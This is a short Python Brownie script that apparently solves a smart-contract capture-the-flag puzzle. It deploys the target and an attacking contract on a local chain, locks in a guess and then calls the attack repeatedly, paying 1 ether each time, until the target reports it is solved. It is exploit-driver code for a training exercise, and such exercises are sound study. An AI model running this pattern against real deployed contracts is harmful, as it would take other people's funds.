#!/usr/bin/python3
from brownie import web3, Attack
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from colorama import Fore
from time import time

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def print_colour(solved):
    if solved:
        print(f"{blue}Is complete: {green}{True}{reset}")
    else:
        print(f"{blue}Is complete: {red}{solved}{reset}")


def hack(contract_address=None, attacker=None):
    if not contract_address:
        target, _ = deploy()
        _, attacker = get_account()
    else:
        print(f"{red}Something is wrong{reset}")
        exit(-1)

    print_colour(target.isComplete())

    attcking_contract = Attack.deploy(target.address, {"from": attacker})

    attcking_contract.lookInGuess({"from": attacker, "value": "1 ether"}).wait(1)

    while target.isComplete() != True:
        try:
            attcking_contract.hack(
                {"from": attacker, "value": "1 ether", "allow_revert": True}
            ).wait(1)
        except:
            pass

    # as ans % 10 so the value can be b/w 0-9
    # target.lockInGuess(3, {"from": attacker, "value": "1 ether"}).wait(1)

    print_colour(target.isComplete())

    assert target.isComplete() == True


def main(contract_address=None):
    if contract_address:
        hack(contract_address, get_account())
    else:
        hack()


if __name__ == "__main__":
    main()
